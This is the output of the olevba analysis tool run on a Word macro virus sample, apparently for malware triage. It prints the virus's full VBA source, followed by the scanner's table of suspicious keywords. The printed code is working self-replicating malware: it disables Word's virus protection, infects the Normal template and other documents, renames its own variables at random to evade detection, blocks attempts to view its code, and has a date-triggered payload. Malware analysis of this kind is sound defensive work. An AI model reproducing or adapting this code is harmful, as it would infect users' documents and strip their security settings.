olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psd.b-e90cf2916b00d1005b5d73ad3fba581db648f056
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psd.b-e90cf2916b00d1005b5d73ad3fba581db648f056 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For PF9327 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next PF9327: End If
JB9365 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
DL9173 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set DC817 = ActiveDocument.VBProject.VBComponents.Item(1)
DE3643 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set DC817 = NormalTemplate.VBProject.VBComponents.Item(1)
KO094 = True
Call QD1778_IG6860
ActiveDocument.Saved = True
End If
If KO094 <> True And DE3643 <> True Then GoTo QI5533
If KO094 = True Then DC817.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, JB9365 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If DE3643 = True Then DC817.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, DL9173 - 4))
QI5533:
If DL9173 <> 0 And JB9365 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function QD1778_IG6860()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "VK1988": r1(2) = "DF3253": r1(3) = "II632": r1(4) = "GC6725": r1(5) = "IG6860": r1(6) = "JB9365"
r1(7) = "DL9173": r1(8) = "DE3643":: r1(9) = "DC817": r1(10) = "KO094": r1(11) = "QI5533": r1(12) = "QD1778": r1(13) = "PM209": r1(14) = "RM9322": r1(15) = "PF9327"
For PF9327 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call IG6860(a1, r1(PF9327))
Next PF9327
End Function 'VAMP v1.0 [thanks Vic!]
Private Function IG6860(RM9322, PM209 As String)
On Error Resume Next
Dim VK1988 As Long: Dim DF3253 As Long: Dim II632 As Long: Dim GC6725 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
VK1988 = 1: DF3253 = 1: II632 = .CountOfLines: GC6725 = Len(.Lines(.CountOfLines, 1))
Do While .Find(PM209, VK1988, DF3253, II632, GC6725, True)
strline = .Lines(VK1988, 1)
strline = Left(strline, DF3253 - 1) & RM9322 & Mid(strline, GC6725)
.replaceline VK1988, strline
VK1988 = II632 + 1: DF3253 = 1:
II632 = .CountOfLines
GC6725 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
Private Function DE122_KP8238()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "TH9290": r1(2) = "KD1549": r1(3) = "CD4584": r1(4) = "NK6527": r1(5) = "KP8238": r1(6) = "KQ3876"
r1(7) = "KO373": r1(8) = "CN1113":: r1(9) = "EM9477": r1(10) = "CP3826": r1(11) = "KH4049": r1(12) = "DE122": r1(13) = "LP1157": r1(14) = "QL5680": r1(15) = "MO4833"
For MO4833 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call KP8238(a1, r1(MO4833))
Next MO4833
End Function 'VAMP v1.0 [thanks Vic!]
Private Function KP8238(QL5680, LP1157 As String)
On Error Resume Next
Dim TH9290 As Long: Dim KD1549 As Long: Dim CD4584 As Long: Dim NK6527 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
TH9290 = 1: KD1549 = 1: CD4584 = .CountOfLines: NK6527 = Len(.Lines(.CountOfLines, 1))
Do While .Find(LP1157, TH9290, KD1549, CD4584, NK6527, True)
strline = .Lines(TH9290, 1)
strline = Left(strline, KD1549 - 1) & QL5680 & Mid(strline, NK6527)
.replaceline TH9290, strline
TH9290 = CD4584 + 1: KD1549 = 1:
CD4584 = .CountOfLines
NK6527 = Len(.Lines(.CountOfLines, 1))
Loop
End With
Sub ViewVBCode()
Application.Quit SaveChanges:=wdDoNotSaveChanges
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

